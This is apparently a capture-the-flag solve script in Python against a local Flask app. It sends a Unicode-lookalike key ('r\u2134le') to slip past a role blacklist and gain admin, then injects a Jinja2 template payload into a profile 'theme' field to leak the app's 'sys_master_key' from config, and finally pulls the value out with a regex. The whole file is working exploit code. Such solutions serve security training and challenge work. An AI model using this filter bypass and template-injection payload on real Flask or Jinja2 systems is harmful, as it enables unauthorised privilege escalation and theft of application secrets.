import requests
import sys
import re

# Change this if your instance is running on a different port/IP
TARGET_URL = "http://127.0.0.1:5000"

def solve():
    # Use a session to persist cookies (UID)
    s = requests.Session()
    
    print(f"[*] Targeting: {TARGET_URL}")
    print("[*] Initializing session...")
    
    # 1. Visit home to generate the session/UID
    try:
        r = s.get(TARGET_URL + "/")
        if r.status_code != 200:
            print("[-] Could not connect to server.")
            sys.exit(1)
    except requests.exceptions.ConnectionError:
        print("[-] Connection refused. Is the flask app running?")
        sys.exit(1)

    # 2. Exploit Unicode Normalization to bypass the 'role' filter
    # We send "râ„´le" (\u2134), which passes the blacklist check.
    # The server normalizes it to "role" and grants us admin privileges.
    print("[*] Sending Unicode bypass payload to become Admin...")
    
    bypass_payload = {
        "r\u2134le": "admin"
    }
    
    r = s.post(TARGET_URL + "/api/v1/update", json=bypass_payload)
    if r.status_code != 200:
        print(f"[-] Privilege escalation failed: {r.text}")
        sys.exit(1)
    
    print("[+] Privilege escalation successful.")

    # 3. Inject SSTI payload into the 'theme' field
    # Now that we are admin, the /dashboard route will render our 'theme'.
    # We inject Jinja2 code to read the 'sys_master_key' from config.
    print("[*] Injecting SSTI payload into profile theme...")
    
    # We use markers (FLAG_START/END) to make regex extraction easier
    ssti_payload = {
        "profile": {
            "theme": "DEFAULT_THEME | FLAG_START {{ config['sys_master_key'] }} FLAG_END"
        }
    }
    
    r = s.post(TARGET_URL + "/api/v1/update", json=ssti_payload)
    if r.status_code != 200:
        print(f"[-] SSTI injection failed: {r.text}")
        sys.exit(1)

    print("[+] Payload injected.")

    # 4. Trigger the exploit
    print("[*] Accessing Admin Dashboard to retrieve flag...")
    r = s.get(TARGET_URL + "/dashboard")

    if "Insufficient Privileges" in r.text:
        print("[-] Exploit failed. You are not admin.")
        sys.exit(1)

    # 5. Extract the flag using Regex
    match = re.search(r"FLAG_START (.*?) FLAG_END", r.text)
    if match:
        print(f"\n[SUCCESS] Flag: {match.group(1)}\n")
    else:
        print("[-] Could not extract flag. Raw response below:")
        print(r.text)

if __name__ == "__main__":
    solve()